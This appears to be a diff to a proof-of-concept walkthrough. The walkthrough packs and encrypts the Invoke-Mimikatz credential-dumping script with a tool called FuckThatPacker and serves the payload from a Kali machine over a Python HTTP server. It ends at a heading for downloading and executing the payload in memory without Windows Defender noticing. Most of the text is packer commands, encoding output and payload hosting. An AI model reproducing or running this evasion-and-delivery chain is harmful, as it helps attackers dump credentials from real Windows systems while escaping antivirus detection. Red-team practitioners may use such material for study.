@@ -27,15 +27,12 @@ PoC - Download and execute into memory a packed/encrypted version of the script 
 Step 1 - Generate a packed/encrypted version of the script 'Invoke-mimkatz.ps1' with FuckThatPacker
 -----------------------------------------------------------------------------------------------------
 
-
 jeff@kali:~/Documents/Tools/FuckThatPacker-master$ python2 ./FuckThatPacker.py -h
-
   ___        _   _____ _         _   ___         _           
  | __|  _ __| |_|_   _| |_  __ _| |_| _ \__ _ __| |_____ _ _ 
  | _| || / _| / / | | | ' \/ _` |  _|  _/ _` / _| / / -_) '_|
  |_| \_,_\__|_\_\ |_| |_||_\__,_|\__|_| \__,_\__|_\_\___|_|  
-                                                          
-                                                                      
+                                                                                    
 Written with <3 by Unknow101/inf0sec
 v1.0
 
@@ -50,18 +47,14 @@ optional arguments:
                         output payload into file
 
 
-
 jeff@kali:~/Documents/Tools/FuckThatPacker-master$ python2 ./FuckThatPacker.py --key 20 -p ./Invoke-Mimi-Custom.ps1 -o ./FTPacker-Invoke-Mimi-Custom.ps1
-
   ___        _   _____ _         _   ___         _           
  | __|  _ __| |_|_   _| |_  __ _| |_| _ \__ _ __| |_____ _ _ 
  | _| || / _| / / | | | ' \/ _` |  _|  _/ _` / _| / / -_) '_|
  |_| \_,_\__|_\_\ |_| |_||_\__,_|\__|_| \__,_\__|_\_\___|_|  
-                                                          
-                                                                      
+                                                                                    
 Written with <3 by Unknow101/inf0sec
 v1.0
-
 [+] Encode UTF16-LE
 [+] Cyphering Payload ...
 [+] Base64 Payload
@@ -83,9 +76,6 @@ drwxr-xr-x 40 jeff jeff    4096 Dec 28 08:17 ..
 
 jeff@kali:~/Documents/Tools/FuckThatPacker-master$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-192.168.1.113 - - [28/Dec/2022 08:25:59] "GET /FTPacker-Invoke-Mimi-Custom.ps1 HTTP/1.1" 200 -
-
-
 
 
 Step 2 - Download and execute into memory the packed/encrypted version of the script Invoke-Mimikatz without being detected by the Windows Defender AV
